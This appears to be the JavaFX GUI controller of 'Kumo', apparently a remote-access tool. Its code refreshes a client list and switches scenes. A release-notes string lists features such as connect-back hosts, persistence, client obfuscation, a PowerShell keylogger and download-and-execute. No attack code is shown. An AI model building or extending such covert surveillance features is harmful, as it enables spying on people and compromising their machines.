package GUI;

import Server.ClientObject;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import Server.KumoSettings;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.scene.Scene;
import javafx.scene.control.TableView;
import javafx.scene.layout.Pane;

import static GUI.Components.ClientList.getTableView;

public class Controller implements Repository {

    /* Reloads the table to ensure Offline/Online status is accurate. */
    public static void updateTable() {
        ObservableList<ClientObject> list = FXCollections.observableArrayList();
        list.addAll(PseudoBase.getKumoData().values());
        getTableView().setItems(list);
        TableView tableView = getTableView();
        tableView.refresh();
    }

    /* Refreshes the number of connections based on KumoData size. */
    @Deprecated
    public static void updateStats() {
        return;
        //Platform.runLater(() -> BottomBar.getConnectionsLabel().setText("  Clients: " + CONNECTIONS.size() + " \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t Version " + KumoSettings.CURRENT_VERSION + " | Developer: Clova" ));
    }

    /* Changes the primary view to the provided scene. */
    public static void changePrimaryStage(Pane newScene) {
        KUMO.Kumo.getPrimaryStage().setScene(new Scene(newScene, 900, 500));
    }

    public static void changePrimaryStage(Pane newScene, int w, int h) {
        KUMO.Kumo.getPrimaryStage().setScene(new Scene(newScene, w, h));
    }

    public static String getReleaseNotes(){
        String s = "Release notes: Kumo v" + KumoSettings.CURRENT_VERSION + " - " + KumoSettings.VERSION_CODENAME + "\n" +
                "\tNew stuff!:\n" +
                "\t\t- Updated UI\n" +
                "\t\t\t* Full transition to Material Design elements.\n" +
                "\t\t\t* Add dark mode/light mode toggle switch. Defaults to dark mode.\n" +
                "\t\t\t* Changed primary application color (mediumslateblue -> #1dd1a1)\n" +
                "\t\t\t* Updated bottom bar color to colored text on white background.\n" +
                "\t\t\t* \"Home\" screen is now the client list.\n" +
                "\t\t\t* Changed top bar to have navigation tiles.\n" +
                "\t\t\t* Changed exit and minimize buttons to rounded buttons.\n" +
                "\t\t\t* Switched navigation icons from PNG to SVG to fix image scaling issues in Windows." +
                "\t\t- Added tooltips on settings text boxes to clear up any uncertainties about what certain settings do.\n" +
                "\t\t- Added the ability to customize the path where the persistence JAR is saved. (Found un Settings>JAR Settings>Persistence Path).\n" +
                "\t\t- Changed some download directories to the client temp directory (it used to just download to the working dir).\n" +
                "\t\t- Add user and OS column to client list\n" +
                "\t\t- Add release notes menu.\n" +
                "\t\t- Add the ability to put a domain name for a connect-back host.\n" +
                "\t\t- Added more server logging.\n" +
                "\t\t- Improved readability of logs.\n" +
                "\t\t- Add the ability to generate ProGuard obfuscation rules for the client JAR.\n" +
                "\t\t- Added linux persistence\n" +
                "\t\t- Added Windows key logger (PowerShell based)\n" +
                "\t\t- Added more stuff to system info.\n\n" +
                "\tBug fixes:\n" +
                "\t\t- Fix proguard rules being generated even if the option was turned off.\n" +
                "\t\t- Changed the first run view to follow material design.\n" +
                "\t\t- Fix download & execute so it works on Windows clients.\n" +
                "\t\t- Fixed accidental stage height reset when double clicking info and updates nav tiles.\n" +
                "\t\t- Fix client exit on Windows.\n" +
                "\t\t- Fix ugly lcd font rendering.\n";
        return s;
    }

}
